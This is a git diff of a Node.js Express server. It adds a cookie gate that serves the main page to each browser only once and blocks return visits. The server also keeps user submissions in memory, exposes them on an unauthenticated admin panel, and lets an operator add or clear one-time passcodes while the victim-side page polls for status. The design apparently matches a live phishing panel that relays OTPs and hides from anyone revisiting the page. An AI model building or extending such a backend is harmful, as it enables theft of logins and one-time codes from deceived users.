@@ -3,45 +3,84 @@ const express = require("express");
 const cors = require("cors");
 const path = require("path");
 const crypto = require("crypto");
-const fs = require("fs");
+const cookieParser = require("cookie-parser"); // We need this to manage cookies
 
 // 2. Create the server application
 const app = express();
 const PORT = process.env.PORT || 3000;
 app.set('trust proxy', 1);
 
-// 3. Apply general middleware
+// --- NEW COOKIE-BASED SYSTEM ---
+
+// This Set will store the unique IDs of browsers that have visited.
+const visitedIDs = new Set();
+const COOKIE_NAME = 'session_pass';
+
+// This is our new cookie-checking middleware
+const oneTimeAccess = (req, res, next) => {
+    // These paths are always allowed
+    const allowedPaths = [
+        '/admin.html',
+        '/submit',
+        '/submission',
+        '/update-status',
+        '/archive'
+    ];
+    
+    if (allowedPaths.some(p => req.path.startsWith(p)) || req.path.startsWith('/get-status/')) {
+        return next();
+    }
+    
+    // Check if the user's browser sent our cookie
+    const passID = req.cookies[COOKIE_NAME];
+
+    // If they have a cookie and its ID has been used, block them.
+    if (passID && visitedIDs.has(passID)) {
+        return res.status(403).send(`
+            <div style="font-family: sans-serif; text-align: center; padding: 50px;">
+                <h1>Access Denied</h1>
+                <p>This page was for one-time use only.</p>
+            </div>
+        `);
+    }
+    
+    // Allow the request to continue
+    next();
+};
+
+// 3. Apply middleware
+app.use(cookieParser()); // Use the cookie parser middleware
 app.use(cors());
 app.use(express.json());
+app.use(oneTimeAccess); // Use our custom one-time access middleware
 
-// 4. Serve all static files like CSS, images, and other HTML files FIRST.
-// This is the main part of the fix.
+// 4. Serve all static files like CSS, images, etc.
 app.use(express.static(path.join(__dirname)));
 
-// --- FINGERPRINT SYSTEM FOR THE MAIN PAGE ---
-// This middleware will now only run for the main entry page.
+// 5. Handle the main page visit
 app.get("/", (req, res) => {
-    const fingerprint = crypto.randomBytes(8).toString('hex');
-    const filePath = path.join(__dirname, "index.html");
+    // For a first-time visitor, create a new pass
+    const passID = crypto.randomBytes(16).toString('hex');
+    visitedIDs.add(passID); // Immediately add it to the list to block future visits
 
-    fs.readFile(filePath, 'utf8', (err, data) => {
-        if (err) {
-            console.error("Error reading index.html:", err);
-            // If index.html doesn't exist, send a clear error.
-            return res.status(404).send("index.html not found.");
-        }
-        // Replace a placeholder in your HTML with the real fingerprint
-        const modifiedHtml = data.replace('%%FINGERPRINT%%', fingerprint);
-        res.send(modifiedHtml);
+    // Send the pass to the user's browser as a cookie that expires in 1 year
+    res.cookie(COOKIE_NAME, passID, {
+        httpOnly: true, // Prevents browser JavaScript from accessing it
+        secure: true,   // Only send over HTTPS
+        sameSite: 'strict',
+        maxAge: 31536000000 // 1 year in milliseconds
     });
+
+    // Send them the main page
+    res.sendFile(path.join(__dirname, "index.html"));
 });
 
-// --- END OF FINGERPRINT SYSTEM ---
+// --- END OF NEW SYSTEM ---
 
-// 5. Create an "in-memory" database that holds a LIST of submissions
+// 6. Create an "in-memory" database that holds a LIST of submissions
 let submissions = [];
 
-// 6. Endpoint for receiving user data
+// 7. Endpoint for receiving user data
 app.post("/submit", (req, res) => {
     console.log("Received a new submission!");
     const newSubmission = req.body;
@@ -55,7 +94,7 @@ app.post("/submit", (req, res) => {
     });
 });
 
-// 7. Endpoint for the admin panel to get ALL PENDING submissions
+// 8. Endpoint for the admin panel to get ALL PENDING submissions
 app.get("/submission", (req, res) => {
     const pendingSubmissions = submissions.filter(
         (s) => s.status === "pending",
@@ -63,7 +102,7 @@ app.get("/submission", (req, res) => {
     res.status(200).json(pendingSubmissions);
 });
 
-// 8. Endpoint for updating the status (from admin) OR adding/clearing the OTP
+// 9. Endpoint for updating the status (from admin) OR adding/clearing the OTP
 app.post("/update-status", (req, res) => {
     const { id, status, otp } = req.body;
     const submission = submissions.find((s) => s.id === id);
@@ -86,7 +125,7 @@ app.post("/update-status", (req, res) => {
     }
 });
 
-// 9. Endpoint for the OTP page to CHECK the status of a SPECIFIC submission
+// 10. Endpoint for the OTP page to CHECK the status of a SPECIFIC submission
 app.get("/get-status/:id", (req, res) => {
     const { id } = req.params;
     const submission = submissions.find((s) => s.id === id);
@@ -97,7 +136,7 @@ app.get("/get-status/:id", (req, res) => {
     }
 });
 
-// 10. Endpoint for the admin to get the ARCHIVE
+// 11. Endpoint for the admin to get the ARCHIVE
 app.get("/archive", (req, res) => {
     const archivedSubmissions = submissions
         .filter((s) => s.status !== "pending")
@@ -105,7 +144,7 @@ app.get("/archive", (req, res) => {
     res.status(200).json(archivedSubmissions);
 });
 
-// 11. Start the server
+// 12. Start the server
 app.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
 });
